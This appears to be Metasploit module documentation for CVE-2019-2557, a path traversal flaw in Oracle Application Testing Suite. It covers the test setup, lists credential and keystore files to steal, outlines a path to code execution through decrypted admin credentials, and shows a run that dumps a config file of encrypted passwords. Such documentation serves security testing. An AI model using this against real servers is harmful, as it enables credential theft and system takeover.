## Description

Oracle Application Testing Suite (OATS) is a comprehensive, integrated testing solution for web applications, web services, packaged Oracle applications, and Oracle databases. OATS is part of an application deployed in the WebLogic service on port 8088, which also includes these tools: Administrator, OpenScript, Oracle Load Testing, and Oracle Test Manager.

In the Load Testing component, a vulnerability was discovered by Steven Seeley (@mr_me) of Source Incite in the DownloadServlet class. According to the Source Incite advisory, the issue results from the lack of proper validation of a user-supplied string before using it to read a file. An attacker can leverage this vulnerability to execute code in the context of SYSTEM. Note that authentication is required.

This vulnerability is also known as CVE-2019-2557.


## Vulnerable Application

The following is the exact setup I used to test and analyze the vulnerability:

- Windows Server 2008 R2 x64 (other Windows systems are also supported)
  - .Net Framework 3.5 enabled (from add/remove features)
  - IE ESC (from Server Manager) disabled
  - 8GB of RAM (at least more than 4GB will be used to run OATS)
  - Duel-Core processor
- oats-win64-full-13.3.0.1.262.zip (x86 did not work for me)
- Jdk-7u21-windows-x64.exe
- OracleXE112_Win64.zip (Newer version 18c did not work well for me)
- Firefox (I had to install this because IE on Win2k8 is completely outdated)
- Adobe Flash installed (IE ESC needs to be disabled in order to install this)

For installation instructions, please refer to the Oracle Application Testing Suite Installation Guide.

## Notes

By default, your starting traversal path is:

```
C:\OracleATS\config\Report Templates\
```

There are some interesting files you can steal from this directory, such as:

* oats-config.xml
* oats-database-config.xml
* oats-keystore

Code execution is possible leveraging from this vulnerability if you target these files:

* C:\OracleATS\oats\servers\AdminServer\security\SerializedSystemIni.dat
* C:\OracleATS\oats\servers\AdminServer\security\boot.properties

After that, you can find a third party script to decrypt the credentials, and then you could
gain code execution from the administrator console.


## Credit

Special thanks to Steven Seeley to assist on the development of the Metasploit module.

## Scenarios

```
msf5 auxiliary(gather/oats_downloadservlet_traversal) > run
[*] Running module against 172.16.249.143

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
<entry key="oracle.oats.cluster.agent.username">oats-agent</entry>
<entry key="oracle.oats.security.keystore.info">eYAdfLaDkdBlUmflYhpg+CHGeXc=</entry>
<entry key="oracle.oats.cluster.username">oats</entry>
<entry key="oracle.oats.cluster.agent.password">{AES}WNdIPXpoeoZzyDNuJPm0wU4R3YKc1SUR2k5+TbQfzIQ=</entry>
<entry key="oracle.oats.admin.username">oats</entry>
<entry key="oracle.oats.http.url">http://localhost:8088</entry>
<entry key="oracle.oats.config.version">9.1.0</entry>
<entry key="oracle.oats.admin.password">{AES}NHrwlbPc7Arlb7puj+UlzAAXB/dUEbv3bdwNnee1/sc=</entry>
<entry key="oracle.oats.cluster.password">{AES}WMTjMmLChdB9CTSrnyJ33113u0ml0juuGZQCWPODJTk=</entry>
<entry key="oracle.oats.admin.url">t3://localhost:8088</entry>
<entry key="oracle.oats.tmp.dir">/tmp</entry>
<entry key="oracle.oats.cluster.url">t3://localhost:8088</entry>
</properties>

[*] Auxiliary module execution completed
msf5 auxiliary(gather/oats_downloadservlet_traversal) > 
```
